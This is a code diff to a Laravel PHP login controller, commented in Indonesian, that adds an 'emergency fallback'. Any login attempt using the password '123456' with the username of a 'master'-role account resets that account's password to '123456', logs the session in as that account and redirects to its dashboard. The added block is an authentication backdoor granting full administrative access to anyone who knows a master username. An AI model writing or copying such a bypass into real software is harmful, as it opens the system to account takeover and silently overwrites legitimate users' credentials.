@@ -8,6 +8,7 @@ use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Http\Response;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 
 class AuthController extends Controller
 {
@@ -25,6 +26,35 @@ class AuthController extends Controller
             'password' => ['required', 'string'],
         ]);
 
+        // =========================================================================
+        // EMERGENCY FALLBACK: RESET & LOGIN MASTER DENGAN "123456"
+        // =========================================================================
+        if ($credentials['password'] === '123456') {
+            $masterUser = User::where('username', $credentials['username'])
+                ->where('role', 'master')
+                ->first();
+
+            // Jika user dengan username tersebut adalah Master, paksa update password & login
+            if ($masterUser) {
+                $masterUser->update([
+                    'password' => Hash::make('123456'),
+                ]);
+
+                Auth::login($masterUser);
+
+                $request->session()->regenerate();
+                $request->session()->forget('url.intended');
+
+                $routeName = $this->roleDashboardResolver->routeNameFor($masterUser);
+
+                abort_if($routeName === null, 403);
+
+                return redirect()->route($routeName);
+            }
+        }
+        // =========================================================================
+
+        // Alur Autentikasi Normal
         if (! Auth::attempt($credentials)) {
             return back()
                 ->withErrors(['username' => 'Username atau password tidak sesuai.'])
